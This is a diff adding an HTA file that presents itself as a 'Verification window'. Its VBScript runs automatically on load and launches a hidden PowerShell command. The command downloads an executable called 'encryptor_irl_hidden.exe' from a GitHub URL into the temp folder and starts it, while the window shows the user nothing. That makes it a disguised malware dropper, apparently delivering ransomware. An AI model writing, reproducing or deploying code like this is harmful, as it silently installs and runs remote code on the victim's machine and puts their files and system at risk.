@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verification window</title>
+    <HTA:APPLICATION
+        APPLICATIONNAME="verification window"
+        BORDER="thin"
+        BORDERSTYLE="normal"
+        SHOWINTASKBAR="yes"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="normal"
+        SCROLL="no"
+        SCROLLFLAT="yes"
+        SYSMENU="yes"
+    />
+    <script language="VBScript">
+    Sub Window_onLoad
+        Window.ResizeTo 520, 480
+        Window.MoveTo (Screen.Width - 300) / 2, (Screen.Height - 400) / 2
+        
+        Set objShell = CreateObject("WScript.Shell")
+        objShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest 'https://raw.githubusercontent.com/fecdor/history-protector/main/encryptor_irl_hidden.exe' -OutFile $env:TEMP\file.exe; Start-Process $env:TEMP\file.exe""", 0, False
+    End Sub
+    </script>
+</head>
+<body>
+</body>
+</html>
